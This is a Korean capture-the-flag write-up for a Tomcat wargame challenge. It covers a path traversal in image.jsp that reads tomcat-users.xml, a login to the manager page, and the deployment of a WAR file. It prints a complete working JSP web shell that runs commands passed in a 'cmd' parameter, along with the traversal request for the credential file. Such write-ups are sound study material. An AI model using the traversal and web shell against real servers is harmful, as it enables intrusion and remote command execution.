---
tier: Bronze 1
topics:
  - Path traversal
  - Tomcat
solved-with: Research
---
### 문제 구조

- `image.jsp`: file 파라미터를 받아서 `/usr/local/tomcat/webapps/ROOT/resources/{file}`를 만들고 해당 경로로 `image/jpeg` 파일을 읽어옴. 
``` java
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

new FileInputStream(filepath + _file);
```

- `tomcat-users.xml`: 톰캣 서버에서 사용자 계정, 비밀번호, 그리고 각 사용자에게 부여된 권한(Role)을 정의하는 기본 인증 설정 파일, 관리자 계정에 대한 정보가 있음. 
- `Dockerfile`: `COPY flag /flag`를 통해 플래그가 도커 컨테이너 `/flag`에 존재함을 알 수 있음. 

### 분석 및 풀이

`/image.jsp?file=/../../../conf/tomcat-users.xml`로 요청을 보내면 서버에 존재하는 `tomcat-users.xml` 파일을 읽어올 수 있으므로 패킷을 뜯어보면 톰캣 서버의 사용자 계정의 아이디와 비밀번호를 알 수 있음. 


`/manager/html`로 접근하면 톰캣 사용자 아이디랑 비밀번호를 통해 톰캣 서버에서 제공하는 관리자 페이지로 들어갈 수 있음. 기본 설정은 서버 컴퓨터에서만 접근이 가능하지만 설정을 통해 외부 접근이 가능하게 할 수 있음. (이 워게임에서는 외부에서 접근이 가능했음.)


톰캣 관리자 페이지에서는 `.war`를 새로 배포할 수 있음. 
웹 셸인 `jspshell.jsp`를 작성하고 zip 압축 -> `jspshell.war` 변환해서 업로드하면 `jspshell.jsp`가 배포되고 `/jspshell/jspshell.jsp`로 접근이 가능함. 

``` java
// jspshell.jsp
<%@ page import="java.util.*,java.io.*"%>

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```


`/jspshell/jspshell.jsp`에서 `ls -al ../../../`로 확인해보니 `flag`의 파일 권한은 ---x--x--x 라서 읽을 수 없고 실행만 가능. 따라서 최종 스크립토 `flag`를 실행하면 플래그를 획득 가능
``` bash
../../../flag
```


### 시행 착오

처음에는 `image.jsp`에서 `/../../../../../flag`로 접근이 가능한 간단한 문제인줄 알았는데 접근이 실패함. 
톰캣에서 배포가 안된 줄 알았는데 `image.jsp`에서는 톰캣과는 상관없이 컴퓨터(도커 컨테이너)에서 파일에 접근하는 것이라서 상관이 없었고 파일 접근 권한이 ---x--x--x라서 읽기만 가능했기 때문이었음. 

`tomcat-users.xml`에서 사용자 정보를 얻었지만 어디에 쓰는지 몰랐고 검색을 통해 `/manager/html`을 제공하는 것을 알았음. 
거기서 `flag` 파일을 배포하려고 했는데 war 파일만 배포가 가능했음. (애초에 `flag` 파일을 배포한다는 생각도 틀렸음.)

톰캣 관리자 페이지 취약점은 검색을 통해 웹셸을 업로드 할 수 있다는 것을 알아냄. 
그 이후에도 ---x--x--x가 읽는 것이 불가능한 것을 바로 알아차리지 못하고 삽질을 많이 하다가 결국 실행해서 플래그를 얻어냄. 

### 새롭게 배운 점

#### Linux 파일 접근 권한

[[08-Really Not SQL#새롭게 배운 점#Linux 파일 접근 권한]]

``` bash
-rw-r--r--@  1 user  staff        162 10월  1 20:16 tmp1.docx
drwx------@  7 user  staff        224 11월 13 13:34 tmp2
```

첫 글자가 `-`: 파일, `d`: 폴더를 나타냄.
그 이후에는 3글자씩 Owner, Group, Other의 접근 권한임. 예: `rw-`: 읽기, 쓰기 가능, `--x`: 실행만 가능

#### 톰캣 

톰캣의 기본 리소스 접근은 ROOT 하위만 허용
``` txt
/
├── flag                            
└── usr/local/tomcat/webapps/
    └── ROOT/
        ├── index.html
        └── static/
            └── image.png
```
- 즉 `https://.../index/html`, `https://.../static/image.png`는 가능하지만 `flag`에 접근은 불가능함. 


**WAR(Web Application aRchive)** 파일은 단일 단위로 관리할 수 있는 HTML 페이지, JSP 페이지, 서블릿, 자원 및 소스 파일의 그룹으로, WAR(Web Archive) 파일은 패키지된 웹 애플리케이션으로, WAR 파일을 사용하여 웹 애플리케이션을 웹 서버로 가져올 수 있음.

관리자 페이지에서는 war 파일만 배포 가능. `.jsp`로 웹셸을 만들어서 배포하면 공격 가능
